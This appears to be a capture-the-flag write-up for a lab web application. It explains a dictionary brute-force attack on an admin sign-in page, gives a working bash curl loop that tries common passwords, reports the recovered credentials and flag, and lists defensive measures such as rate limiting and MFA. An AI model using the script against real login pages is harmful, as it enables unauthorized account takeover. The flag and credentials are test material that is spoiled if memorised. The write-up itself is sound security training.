#06_BrutForce

##Research explanation
- On the sign-in webpage, we have a username and password field visible - http://192.168.56.101/index.php?page=signin
- A common breach with user credentials is to try the brut force method, which will load several username and password combinations to find one of the valid ones.
- To do it, we will download a list of the most common passwords usually used. NB: a new list is usually edited every year.
- In our case, we chose this one: https://github.com/tarraschk/richelieu le french_password_top1000.txt.
- We pasted and copied the entire list in a 'dictionnaire' file.
- Then, to load and test all these passwords, we will automate the connection attempts.
- We will use a 'curl' command inside a loop to test all these passwords and try to find the 'admin' credentials:
----------------------------
#!/bin/bash
for i in $(cat dictionnaire)
	do
		curl -X POST "http://192.168.56.101/index.php?page=signin&username=admin&password=$i&Login=Login#" | grep 'flag'>>result.txt
if grep 'flag' ./result.txt
then
  echo "Password: $i">>result.txt
  exit
else
  echo "not $i"
fi
done
----------------------------
- Then, if a password is working, we will check for the word 'flag' (as usually there is always the word flag when we find it) and print the password inside a new 'txt' file.
- After a long time, the credentials are found: 
username: admin
password: shadow
- We just have to enter again the credentials and the flag is there: B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2

##Breach Details 
- As it is too easy to access hundreds of millions of valid username and password combinations for credential stuffing, default administrative account lists, automated brute force, and dictionary attack tools, the brut force attack is a really common method.
- Loop over a list of most common credentials is really easy to do.

Recommendation: 
- There are several ways to prevent this attack, but it is difficult to totally prevent it as it is mainly due to human lack of rigor regarding passwords.
- You can implement a check of the most-common password used and don't accept these weak passwords.
- Limit or increasingly delay failed login attempts (good example: the brut force delay of the iPhone)
- The implementation of 'strong password rules' (password length, complexity, and rotation policies), following the NIST 800-63 B’s guidelines in section 5.1.1 for Memorized Secrets or other modern, evidence-based password policies.
- Where possible, implement multi-factor authentication to prevent automated credential stuffing, brute force, and stolen credential re-use attacks.
- Do not ship or deploy with any default credentials, particularly for admin users.
- Multiple additional resources: 
https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks
https://owasp.org/www-community/attacks/Brute_force_attack
https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication


##How to:
- Get a list of the most common passwords usually used and copy-paste them in a 'dictionnaire' file
- Run the shell script 'script.sh' with the 'dictionnaire' file
- When it is done, use the below credentials:
username: admin
password: shadow
- The flag is there
